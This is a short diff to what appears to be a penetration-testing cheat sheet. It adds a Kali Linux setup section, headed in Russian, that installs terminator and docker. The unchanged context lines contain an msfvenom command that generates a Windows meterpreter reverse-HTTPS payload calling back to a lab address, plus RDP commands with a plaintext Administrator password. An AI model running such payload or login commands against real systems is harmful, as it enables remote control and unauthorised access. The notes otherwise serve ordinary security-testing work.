@@ -205,3 +205,11 @@ msfvenom -p windows/meterpreter/reverse_winhttps lhost=172.16.7.2 lport=443 -e x
 rdp_check <domain>/<name>:<password>@<IP>
 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.186.81 /u:'Administrator' /p:'Password321'
 ```
+
+## Настройка Kali
+
+```
+apt-get update && apt-get upgrade -y
+apt-get install terminator -y
+apt install docker.io -y
+```
